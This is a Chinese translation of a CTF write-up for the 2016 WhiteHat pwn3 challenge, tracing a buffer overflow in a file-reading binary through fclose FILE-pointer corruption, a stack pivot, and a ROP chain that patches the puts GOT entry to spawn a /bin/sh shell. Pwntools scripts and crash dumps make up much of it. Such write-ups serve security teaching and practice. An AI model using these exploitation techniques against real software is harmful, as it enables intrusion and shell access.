> 原文链接: https://www.anquanke.com//post/id/84565 


# 【CTF通关攻略】白帽大会-pwn3-挑战指南


                                阅读量   
                                **86233**
                            
                        |
                        
                                                                                    



##### 译文声明

本文是翻译文章，文章原作者，文章来源：安全客
                                <br>原文地址：[http://ctfhacker.com/pwn/2016/09/11/whitehat-pwn3.html](http://ctfhacker.com/pwn/2016/09/11/whitehat-pwn3.html)

译文仅供参考，具体内容表达以及含义原文为准



[![](https://p5.ssl.qhimg.com/t012a326aa0f1ac948b.jpg)](https://p5.ssl.qhimg.com/t012a326aa0f1ac948b.jpg)

2016年白帽大会结束了，让我们来看一看会中提出的pwn3挑战。

**<br>**

**挑战**

二进制文件本身是很简单的，因为其中只有两个函数︰ write_file 和 read_file，而Write_file 函数又非常简单直接。



```
$ r2 readfile
[0x08048640]&gt; aaa
[0x08048640]&gt; s sym.write_file 
[0x080486f4]&gt; pdf~call
|           0x08048708      e833feffff     call sym.imp.printf
|           0x08048715      e816ffffff     call sym.imp.__fpurge
|           0x08048721      e82afeffff     call sym.imp.gets
|           0x08048737      e8d4feffff     call sym.imp.fopen
|       |   0x0804874c      e85ffeffff     call sym.imp.puts
|       |   0x08048758      e873feffff     call sym.imp.exit
|           0x08048765      e8d6fdffff     call sym.imp.printf
|           0x08048779      e8a2feffff     call sym.imp.__isoc99_scanf
|           0x080487c5      e876fdffff     call sym.imp.printf
|           0x080487d2      e859feffff     call sym.imp.__fpurge
|           0x080487ef      e86cfdffff     call sym.imp.fgets
|           0x0804880f      e87cfdffff     call sym.imp.fwrite
|           0x0804881a      e851fdffff     call sym.imp.fclose
```



简单地说，write_file 将执行以下操作︰

要求用户提供文件名

如果给定文件名打不开，那直接退出；

要求用户提供写入文件的大小；

要求用户提供写入文件的数据；

将给定数据写入指定文件名；

退出。

这部分没有什么特别之处。我们可以直接将我们的文件内容写入磁盘。

有趣的部分是read_file。这部分代码的开始部分和 write_file 很类似。

要求用户提供文件名；

如果打不开给定文件名，就退出。

假设给定文件名是有效的，那么会直接执行接下来的代码。



```
|       `-&gt; 0x0804888e      c74424080200.  mov dword [esp + 8], 2
|           0x08048896      c74424040000.  mov dword [esp + 4], 0
|           0x0804889e      8b45f4         mov eax, dword [ebp - local_ch]
|           0x080488a1      890424         mov dword [esp], eax
|           0x080488a4      e8d7fcffff     call sym.imp.fseek
|           0x080488a9      8b45f4         mov eax, dword [ebp - local_ch]
|           0x080488ac      890424         mov dword [esp], eax
|           0x080488af      e83cfdffff     call sym.imp.ftell
|           0x080488b4      8945f0         mov dword [ebp - local_10h], eax
|           0x080488b7      c74424080000.  mov dword [esp + 8], 0
|           0x080488bf      c74424040000.  mov dword [esp + 4], 0
|           0x080488c7      8b45f4         mov eax, dword [ebp - local_ch]
|           0x080488ca      890424         mov dword [esp], eax
|           0x080488cd      e8aefcffff     call sym.imp.fseek
|           0x080488d2      8b55f0         mov edx, dword [ebp - local_10h]
|           0x080488d5      8d85f0feffff   lea eax, [ebp - local_110h]
|           0x080488db      8b4df4         mov ecx, dword [ebp - local_ch]
|           0x080488de      894c240c       mov dword [esp + 0xc], ecx
|           0x080488e2      89542408       mov dword [esp + 8], edx
|           0x080488e6      c74424040100.  mov dword [esp + 4], 1
|           0x080488ee      890424         mov dword [esp], eax
|           0x080488f1      e8aafcffff     call sym.imp.fread
|           0x080488f6      8d85f0feffff   lea eax, [ebp - local_110h]
|           0x080488fc      890424         mov dword [esp], eax
|           0x080488ff      e8acfcffff     call sym.imp.puts
|           0x08048904      8b45f4         mov eax, dword [ebp - local_ch]
|           0x08048907      890424         mov dword [esp], eax
|           0x0804890a      e861fcffff     call sym.imp.fclose
|           0x0804890f      c9             leave
           0x08048910      c3             ret
```



此函数会在fread时发生多汁，无论给定的写入内容是什么，Fread 都会将其写入 local_110h，这就给了我们一个缓冲区溢出漏洞。

在此溢出中， local_ch 变量将会被覆盖，该变量中会包含打开文件的文件标头。在溢出之后会出现这个问题，然后此指针会被传递给 fclose。如果该指针不指向一个有效的文件结构，会出现一个神奇的错误，在这种情况下这样的错误对用户来说很不利。

我们从下面的脚本开始。此脚本只是创建了函数，使得调用该二进制文件函数变得更容易一点。我们将文件名设置称大写字符循环值，将文件内容设置成另一种循环的小写字符；所以如果我们在之后的崩溃中看到这些循环值，就可以知道数据 (在 Github win_1.py) 的出处了。



```
from pwn import *
import string
 
context.terminal = ['tmux', 'splitw', '-h']
 
r = None
 
def write_file(name, data):
    r.sendline('1')
    r.sendline(name)
    r.sendline(str(len(data)))
    r.sendline(data)
 
def read_file(name):
    r.sendline('2')
    r.sendline(name)
 
filename = '/tmp/' + cyclic(240, alphabet=string.ascii_uppercase)
print(filename)
try:
    os.remove(filename)
except:
    pass
 
r = process("./readfile")
write_file(filename, cyclic(1000))
 
r = process("./readfile")
gdb.attach(r, '''
c
''')
read_file(filename)
 
r.interactive()
```



执行这个代码之后，我们会看到下面这样的问题。



```
[----------------------REGISTERS-----------------------]
*EAX  0x63616170 ('paac')
*EBX  0xf771b000 &lt;-- 0x1a9da8
*ECX  0xf771bb07 (_IO_2_1_stdout_+71) &lt;-- 0x71c8980a /* 'nq' */
*EDX  0xf771c898 &lt;-- 0x0
*EDI  0x0
*ESI  0x63616170 ('paac')
*EBP  0xffe59fa8 &lt;-- 'saactaacuaacvaa...'
*ESP  0xffe59e50 --&gt; 0xf771bac0 (_IO_2_1_stdout_) &lt;-- 0xfbad2887
*EIP  0xf75d4386 (fclose+22) &lt;-- cmp    byte ptr [esi + 0x46], 0 /* '~F' */
[-------------------------CODE-------------------------]
 =&gt; 0xf75d4386 &lt;fclose+22&gt;    cmp    byte ptr [esi + 0x46], 0
    0xf75d438a &lt;fclose+26&gt;    jne    0xf75d4510          &lt;0xf75d4510; fclose+416&gt;
[------------------------STACK-------------------------]
00:0000| esp  0xffe59e50 --&gt; 0xf771bac0 (_IO_2_1_stdout_) &lt;-- 0xfbad2887
01:0004|      0xffe59e54 --&gt; 0xf771b000 &lt;-- 0x1a9da8
02:0008|      0xffe59e58 &lt;-- 0x0
03:000c|      0xffe59e5c &lt;-- 0x0
04:0010|      0xffe59e60 --&gt; 0xffe59fa8 &lt;-- 'saactaacuaacvaa...'
05:0014|      0xffe59e64 --&gt; 0xf7747500 &lt;-- pop    edx
06:0018|      0xffe59e68 --&gt; 0xf771c898 &lt;-- 0x0
07:001c|      0xffe59e6c --&gt; 0xf771b000 &lt;-- 0x1a9da8
[----------------------BACKTRACE-----------------------]
&gt;  f 0 f75d4386 fclose+22
   f 1  804890f read_file+231
   f 2 63616174
   f 3 63616175
   f 4 63616176
   f 5 63616177
   f 6 63616178
   f 7 63616179
   f 8 6461617a
   f 9 64616162
   f 10 64616163
Program received signal SIGSEGV
```



在这里，我们看到因为 esi 是循环字符串 paac 的一部分，从而不能取消引用esi + 0x46，所以才发生了崩溃。我们还不确定这在文件结构中意味着什么，所以来看看如果将 paac 设置为任意的有效地址是否可以绕过这个问题。首先，让我们将 esi 值设置为我们的文件名值。



```
$ r2 readfile 
[0x08048640]&gt; aaa
[0x08048640]&gt; s obj.name
[0x0804a0a0]&gt;
```



在脚本中更新 paac (win_2.py 在 Github) 偏移量的值。



```
data = 'a' * cyclic_find('paac')
data += p32(0x804a0a0) # Global address for obj.name
data += 'b' * (1000 - len(data))
write_file(filename, data)
```



然后出现了下面这样的崩溃问题。



```
[----------------------REGISTERS-----------------------]
...
*EDI  0x41415241 ('ARAA')
...
[-------------------------CODE-------------------------]
 =&gt; 0xf76a9d40 &lt;fclose+64&gt;     cmp    ebp, dword ptr [edi + 8]
    0xf76a9d43 &lt;fclose+67&gt;     je     0xf76a9d69          &lt;0xf76a9d69; fclose+105&gt;
```



所以可以看到我们的 edi值指向的是文件名中循环的一部分。这次，将ARAA值替换为无效的文件名地址。结果就是，我们尝试了几个不同的无效地址，都不会导致这样的崩溃。我们的有效地址存在于可写模块当中︰ 0x804af00 (在 Github win_3.py)。

这次，我们遇到了一次有趣的崩溃现象。



```
[----------------------REGISTERS-----------------------]
*EAX  0x41414141 ('AAAA')
 EBX  0xf7710000 &lt;-- 0x1a9da8
*ECX  0x706d742f ('/tmp')
*EDX  0x100
*EDI  0x1000
*ESI  0x804a0a0 (name) &lt;-- '/tmp/aaaabaaaca...'
*EBP  0x61616461 ('adaa')
*ESP  0xffc1a0f0 --&gt; 0x804a0a0 (name) &lt;-- '/tmp/aaaabaaaca...'
*EIP  0xf768da8d &lt;-- call   dword ptr [eax + 0x3c]
 [-------------------------CODE-------------------------]
  =&gt; 0xf768da8d    call   dword ptr [eax + 0x3c]
```



在我们控制 eax调用 [eax + 0x3c]时发生了崩溃。这意味着我们可以将 eax 设置为任何地址减去 0x3c（计算所得），并调用任何函数。值得一提的是，我们还控制了 ebp。这非常有趣，因为将 ebp 设置为任何我们控制的地址，并使用一个 leave; ret ROP小工具将我们的堆栈旋转到任何位置。(见 Github win_4.py)



```
leaveret = 0x80486f1
 
data = p32(leaveret)
 
data2 = 'c' * cyclic_find('aaca')
data2 += p32(0x04a0f000) # Use one of the next 0x08 bytes here for the address 0x0804a0f0 (some bytes into the filename)
data2 += 'x08' * (cyclic_find('ARAA', alphabet=string.ascii_uppercase) - 4 - len(data2))
data += data2
 
data += p32(0x804af00)      # 2) Some valid address to pass fclose
data += p32(0x804a0a5-0x3c) # 3) Address we will be calling at instruction call [eax + 0x3c]
data += cyclic(240-len(data), alphabet=string.ascii_uppercase)
filename = '/tmp/' + data
```



下面，我们为内存添加安装一个 ROP 链来进行完整的执行过程。<br>



```
[----------------------REGISTERS-----------------------]
...
*EBP  0x41414141 ('AAAA')
*ESP  0x804a0f8 (name+88) &lt;-- 'CAAADAAAEAAAFAA...'
EIP  0x41414142 ('BAAA')
[------------------------STACK-------------------------]
00:0000| esp  0x804a0f8 (name+88) &lt;-- 'CAAADAAAEAAAFAA...'
01:0004|      0x804a0fc (name+92) &lt;-- 'DAAAEAAAFAAAGAA...'
02:0008|      0x804a100 (name+96) &lt;-- 'EAAAFAAAGAAAHAA...'
03:000c|      0x804a104 (name+100) &lt;-- 'FAAAGAAAHAAAIAA...'
04:0010|      0x804a108 (name+104) &lt;-- 'GAAAHAAAIAAAJAA...'
05:0014|      0x804a10c (name+108) &lt;-- 'HAAAIAAAJAAAKAA...'
06:0018|      0x804a110 (name+112) &lt;-- 'IAAAJAAAKAAALAA...'
07:001c|      0x804a114 (name+116) &lt;-- 'JAAAKAAALAAAMAA...'
[----------------------BACKTRACE-----------------------]
&gt;  f 0 41414142
   f 1 41414143
   f 2 41414144
   f 3 41414145
   f 4 41414146
```



**现在我们看一下ROP**

****

通过读取服务器上的 /etc/os-release，我们知道该服务器是 Ubuntu 14 机器。我们现在使用的也是 Ubuntu 14 机，所以我们假定这是相同的 libc。（请注意，由于游戏服务器已经过期，所以我们最后没有在该游戏服务器中测试这个链接。先假设本地环境与游戏服务器完全一致)

有很多 ROP 链的可能结果，所以让我们尝试调用magic ROP gadget来从libc中调用execve('/ bin/sh '，0，0)。我们在 libc_base + 0x40069 里面发现了这个小工具。通常情况下，用户会在之前就调用它，但因为我们在过程中重写了，所以我们可以简单地将 eax 设置为/bin/sh，然后调用其余的操作说明。
<li>
<pre>`text:00040069                 mov     [esp+16Ch+status], eax`</pre>
</li>
<li>
<pre>`text:0004006C                 call    execve`</pre>
</li>
  使用ROPgadget –depth 50 –binary readfile可以在二进制文件中发现两个有用的小工具。

```
0x080486af : mov eax, dword ptr [0x804a088] ; cmp eax, ebx ; jb 0x80486ba ; mov byte ptr [0x804a084], 1 ; add esp, 4 ; pop ebx ; pop ebp ; ret
```



```
0x080486be : add dword ptr [ebx + 0x5d5b04c4], eax ; ret
```



结果就是，在此二进制文件没有一个简单的pop eax; ret，所以我们必须现写一个值放入eax 。这时候第一个小工具就派上用场了。第一个小工具会从 0x804a088 取出某个值，然后将该值放入 eax。现在我们要问"我们怎样才能在 0x804a088中得到一个值"？幸运的是，gets可以直接进入二进制文件。所以我们能够将一个值放入 eax 的保险做法如下︰

ROP进入gets(0x804a088)

发送一个存储在 0x804a088的值

ROP进入 0x80486af中将那个值放入eax

我们需要预设 ebx 为零，以使它永远无法通过 cmp eax、 ebx 检查。利用一个简单的pop ebx; pop ebp; ret就很容易达到。这个相同的小工具之后，我们还会看到一个pop ebx。所以还可以利用这个小工具将任意值放入 ebx。这很重要，因为第二个工具可以用来在地址+ 0x5d5b04c4将一个常量添加到 ebx  。

我们的攻击计划是将一个常量值添加到puts GOT条目，这样结果就会指向 libc 地址。我们可以通过使用 pwntools找出所需添加的值（我们选择任意添加）。



```
&gt;&gt;&gt; from pwn import *
&gt;&gt;&gt; elf = ELF('libc-2.19.so')
&gt;&gt;&gt; # 0x40069 is from the above magic libc offset
&gt;&gt;&gt; print(0x40069 - elf.symbols['puts'])
-153075
&gt;&gt;&gt; hex(0xffffffff-153075)
'0xfffdaa19'
```



  这时，我们可以简单地调用puts来调用我们的神奇函数，并使用外壳程序。

  让我们看看如何在ROP链中将这一计划付诸行动︰

**<br>**

**ROP链1**

因为我们目前内存有限，所以直接使用接下来的0x804a000 块调用 gets，这将使我们能够拥有更大的 ROP 链。

发送第二个ROP链。

枢轴堆栈到这个新的地址，所以我们现在可以执行一个多大的 ROP 链。

**<br>**

**ROP 链2**

调用gets(0x804a088)。

发送 0xfffdaa18 来存储数值到0x804a08c。

用正确堆栈调用Ebx 到 0xfffdaa13 mov eax ，将 puts-0x5d5b04c4 调用到eax（由于重新添加的小工具提出0x5d5b04c4 ）。

调用 0x80486be 添加常数到 puts ，来获得魔法 libc 地址。

调用 gets(0x804af00) 将字符串 /bin/sh放入内存。

调用 gets(0x804a088)，将指向字符串 /bin/sh 的指针放入到内存中，为第一个小工具做准备。

调用第一个工具将指向/bin/sh 的指针放入eax。

调用puts来触发libc小工具。

最终的代码可以在 Github 的 win_5.py 中找到。
